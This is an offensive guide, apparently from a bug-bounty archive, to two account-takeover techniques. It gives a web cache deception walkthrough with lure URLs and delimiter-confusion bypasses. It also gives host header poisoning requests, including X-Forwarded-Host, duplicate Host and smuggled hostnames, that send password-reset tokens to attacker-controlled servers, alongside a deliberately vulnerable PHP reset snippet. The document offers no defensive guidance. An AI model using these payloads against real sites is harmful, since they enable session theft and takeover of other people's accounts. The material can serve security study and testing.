# Web Cache Deception & Host Header Poisoning for Account Takeover (ATO)

A comprehensive deep-dive into two high-impact account takeover mechanisms: exploiting CDN caching rules to steal active sessions, and poisoning host headers to hijack password reset links.

---

## Part 1: Web Cache Deception (WCD)

### 1. The Core Vulnerability Mechanism
Web Cache Deception occurs when an edge cache (e.g., Cloudflare, Akamai, Fastly, AWS CloudFront) and the origin web application interpret HTTP request paths differently:

```text
[ Attacker / Victim ] ---> [ CDN Edge Cache ] ---> [ Origin Web Server ]
```

1. **Origin Server:** Employs dynamic routing (e.g., path variables or regex). When requested with `/api/user/me/test.css`, it strips the non-existent file suffix `/test.css` and renders the sensitive dynamic user profile `/api/user/me`.
2. **CDN Cache:** Relies strictly on file extensions. Because the URL ends in `.css` (a static asset), the CDN stores the response in its public edge cache.
3. **The Result:** The victim's private account data, session cookies, and CSRF tokens are now cached publicly and can be fetched by anyone without credentials.

---

### 2. Step-by-Step Attack Walkthrough

```text
Step 1: Attacker crafts a poisoned lure link:
        https://target.com/account/settings/avatar.css

Step 2: Attacker sends this link to a logged-in Victim (via forum, chat, email, or social media).

Step 3: Victim clicks the link in their authenticated browser session:
        GET /account/settings/avatar.css HTTP/1.1
        Host: target.com
        Cookie: session=victim_active_session_token

Step 4: Origin server returns the victim's private profile settings (including API keys/tokens).
        The CDN sees the .css extension and caches the response.

Step 5: Attacker opens the exact same URL from an unauthenticated browser:
        GET /account/settings/avatar.css HTTP/1.1
        Host: target.com
        (No Cookies)

Step 6: The CDN serves the cached victim response directly!
        Attacker extracts victim's session tokens -> Instant Account Takeover.
```

---

### 3. Delimiter Confusion & Bypass Techniques

Modern CDNs frequently patch basic extension matching. Attackers employ delimiter confusion:

| Technique | Example URI | Mechanism |
| :--- | :--- | :--- |
| **Semicolon Delimiter** | `/account;test.css` | Framework treats `;` as parameter; CDN treats `.css` as extension. |
| **URL Encoded Hash** | `/account%23test.css` | Origin decodes `%23` to `#` (fragment); CDN matches extension literally. |
| **URL Encoded Question**| `/account%3Ftest.css` | Origin decodes `%3F` to `?` (query); CDN caches full path. |
| **Newline Injection** | `/account%0Atest.css` | Parser discrepancy in HTTP path normalization. |
| **Modern Image Formats**| `/account/data.avif` | Bypasses filters blocking legacy `.png` / `.jpg` extensions. |

---

## Part 2: Host Header Poisoning for Password Reset Hijacking

### 1. The Vulnerability Mechanism
When a user requests a password reset, the application dynamically constructs the reset URL using the HTTP `Host` header sent by the client:

```php
// VULNERABLE CODE EXAMPLE
$reset_token = generate_random_token();
$reset_link = "https://" . $_SERVER['HTTP_HOST'] . "/reset-password?token=" . $reset_token;
send_email($victim_email, "Password Reset Link", $reset_link);
```

If the server does not validate the `Host` header against a strict whitelist of legitimate domain names, an attacker can manipulate the host header.

---

### 2. Step-by-Step Attack Flow

```text
Step 1: Attacker sends a forged password reset request for victim@target.com:

        POST /api/v1/password/reset HTTP/1.1
        Host: attacker-controlled-server.com
        Content-Type: application/json

        {"email": "victim@target.com"}

Step 2: Target application generates a cryptographically secure, valid reset token (e.g., e7f9b8c2...).

Step 3: Target application sends an email to victim@target.com:
        "Click here to reset your password:
         https://attacker-controlled-server.com/reset-password?token=e7f9b8c2..."

Step 4: The unsuspecting victim receives the legitimate email from target.com and clicks the link.

Step 5: The victim's browser sends the reset token to attacker-controlled-server.com in the HTTP access log:
        GET /reset-password?token=e7f9b8c2... HTTP/1.1
        Host: attacker-controlled-server.com

Step 6: Attacker extracts token e7f9b8c2... and completes password reset on target.com.
        Victim account is fully taken over.
```

---

### 3. Advanced Host Header Tampering Variations

When standard `Host` header alteration returns `400 Bad Request` or is blocked by load balancers:

1. **Proxy Forwarding Headers:**
   ```http
   POST /forgot-password HTTP/1.1
   Host: target.com
   X-Forwarded-Host: attacker-server.com
   X-Host: attacker-server.com
   X-Forwarded-Server: attacker-server.com
   ```
2. **Duplicate Host Headers:**
   ```http
   POST /forgot-password HTTP/1.1
   Host: target.com
   Host: attacker-server.com
   ```
3. **Port Confusion & Hostname Smuggling:**
   ```http
   POST /forgot-password HTTP/1.1
   Host: target.com:password-reset.attacker.com
   or
   Host: target.com@attacker-server.com
   ```

---
*Archived in Auth Bypass Vault from verified bug bounty community intelligence.*
